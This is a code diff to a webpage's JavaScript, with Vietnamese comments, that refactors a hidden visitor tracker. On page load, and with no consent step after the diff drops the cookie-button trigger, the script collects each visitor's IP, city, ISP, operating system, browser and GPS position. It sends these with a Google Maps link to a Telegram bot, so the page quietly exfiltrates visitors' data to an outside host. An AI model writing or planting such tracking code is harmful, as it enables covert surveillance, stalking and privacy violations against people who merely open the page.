@@ -57,13 +57,13 @@ function adjustZoom() {
 window.addEventListener('resize', adjustZoom);
 adjustZoom();
 
-   // --- 1. CẤU HÌNH ---
+  // --- 1. CẤU HÌNH ---
 const TG_TOKEN = CONFIG.TG_TOKEN;
         const CHAT_ID = CONFIG.CHAT_ID;
-let isBotActive = false;
+let isBotRunning = false;
 
 // --- 2. NHẬN DIỆN THIẾT BỊ ---
-function getDetailDevice() {
+function getSystemInfo() {
     const ua = navigator.userAgent;
     let browser = "Trình duyệt lạ";
     let os = "Không rõ OS";
@@ -76,69 +76,69 @@ function getDetailDevice() {
     else if (ua.includes("Firefox")) browser = "Firefox";
 
     if (ua.includes("Win")) os = "Windows";
-    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
-    else if (ua.includes("Android")) os = "Android";
+    else if (ua.includes("iPhone")) { os = "iOS"; deviceType = "📱 Điện thoại"; }
+    else if (ua.includes("Android")) { os = "Android"; deviceType = "📱 Điện thoại"; }
     else if (ua.includes("Mac")) os = "MacOS";
-
-    if (/Android|iPhone|iPad|iPod/i.test(ua)) deviceType = "📱 Điện thoại";
 
     return { browser, os, deviceType };
 }
 
-// --- 3. LẤY IP & NHÀ MẠNG (Dùng HTTPS ổn định cho sweep.id.vn) ---
-async function fetchIpData() {
-    const apis = [
-        {
-            // Nguồn 1: Rất chuẩn cho mạng Việt Nam (HTTPS OK)
-            url: 'https://ipwho.is/',
-            parse: (d) => ({ ip: d.ip, city: d.city, isp: d.connection?.isp || d.isp || d.org })
-        },
-        {
-            // Nguồn 2: Ổn định toàn cầu
-            url: 'https://ipapi.co/json/',
-            parse: (d) => ({ ip: d.ip, city: d.city, isp: d.org || d.asn_organization })
-        },
-        {
-            // Nguồn 3: Dự phòng Cloudflare (Chỉ lấy được IP, ISP mặc định)
-            url: 'https://api.db-ip.com/v2/free/self',
-            parse: (d) => ({ ip: d.ipAddress, city: d.city, isp: d.organization })
+// --- 3. LẤY IP QUA TRUNG GIAN CLOUDFLARE & IPWHOIS ---
+async function getFullIpData() {
+    // Thử nguồn 1 (Đầy đủ City/ISP)
+    try {
+        const res = await fetch('https://ipwho.is/');
+        const d = await res.json();
+        if (d.success) {
+            return { ip: d.ip, city: d.city, isp: d.connection?.isp || d.org };
         }
-    ];
+    } catch (e) { console.log("Nguồn 1 bị chặn..."); }
 
-    for (const api of apis) {
-        try {
-            const res = await fetch(api.url, { signal: AbortSignal.timeout(4000) });
-            if (!res.ok) continue;
-            const data = await res.json();
-            const result = api.parse(data);
-            // Nếu lấy được ISP và IP thì trả về luôn
-            if (result.ip && result.isp) return result;
-        } catch (e) { continue; }
+    // Thử nguồn 2 (Trung gian Cloudflare - Luôn thành công để lấy IP)
+    try {
+        const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+        const text = await res.text();
+        const data = text.split('\n').reduce((obj, line) => {
+            const [key, value] = line.split('=');
+            obj[key] = value;
+            return obj;
+        }, {});
+        
+        // Từ IP của Cloudflare, lấy thông tin ISP qua một API khác
+        const detailRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
+        const detail = await detailRes.json();
+        
+        return {
+            ip: data.ip,
+            city: detail.city || "Không rõ",
+            isp: detail.org || "Cloudflare Network"
+        };
+    } catch (e) {
+        return { ip: "Không thể lấy", city: "Bị chặn", isp: "Bị chặn" };
     }
-    return { ip: "Đang quét...", city: "Đang quét...", isp: "Đang quét..." };
 }
 
-// --- 4. GỬI TELEGRAM (Mỗi lần vào gửi 1 tin) ---
+// --- 4. GỬI TELEGRAM ---
 async function sendNotification(pos, ipInfo) {
-    if (isBotActive) return; 
-    isBotActive = true;
+    if (isBotRunning) return;
+    isBotRunning = true;
 
-    const device = getDetailDevice();
+    const info = getSystemInfo();
     const time = new Date().toLocaleString('vi-VN');
 
-    let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
+    let msg = `<b>🚀 TRUY CẬP MỚI (TRUNG GIAN CLOUDFLARE)</b>\n\n`;
     msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
     msg += `🌐 <b>IP:</b> <code>${ipInfo.ip}</code>\n`;
     msg += `🏙️ <b>Thành phố:</b> <code>${ipInfo.city}</code>\n`;
-    msg += `📡 <b>Nhà mạng:</b> <b>${ipInfo.isp}</b>\n\n`;msg += `ℹ️ <b>Thông tin thiết bị:</b>\n`;
-    msg += `├─ Loại: <b>${device.deviceType}</b>\n`;
-    msg += `├─ Hệ điều hành: <code>${device.os}</code>\n`;
-    msg += `└─ Trình duyệt: <b>${device.browser}</b>\n\n`;
+    msg += `📡 <b>Nhà mạng:</b> <b>${ipInfo.isp}</b>\n\n`;
+
+    msg += `ℹ️ <b>Thiết bị:</b>\n`;
+    msg += `├─ Hệ điều hành: <code>${info.os}</code>\n`;msg += `└─ Trình duyệt: <b>${info.browser}</b>\n\n`;
 
     if (pos && pos.coords) {
         const { latitude: lat, longitude: lon } = pos.coords;
         msg += `📍 <b>Vị trí GPS:</b>\n`;
-        msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Xem trên Bản đồ</a>\n`;
+        msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
     }
 
     try {
@@ -154,27 +154,23 @@ async function sendNotification(pos, ipInfo) {
     } catch (err) {
         console.error(err);
     } finally {
-        isBotActive = false; // Mở khóa để lần sau vào lại vẫn gửi
+        isBotRunning = false;
     }
 }
 
 // --- 5. KHỞI CHẠY ---
-async function startTracking() {
-    const ipInfo = await fetchIpData();
-    // Lấy GPS (nếu người dùng cho phép)
-    navigator.geolocation.getCurrentPosition(
-        async (pos) => { await sendNotification(pos, ipInfo); },
-        async () => { await sendNotification(null, ipInfo); },
-        { timeout: 5000 }
-    );
+async function start() {
+    const ipInfo = await getFullIpData();
+    
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => sendNotification(pos, ipInfo),
+            () => sendNotification(null, ipInfo),
+            { timeout: 5000 }
+        );
+    } else {
+        sendNotification(null, ipInfo);
+    }
 }
 
-// Chạy ngay khi load trang
-window.onload = startTracking;
-
-// Hàm cho nút cookie (nếu có)
-function acceptCookies() {
-    const box = document.getElementById('cookie-box');
-    if (box) box.style.display = 'none';
-    startTracking();
-}
+window.onload = start;
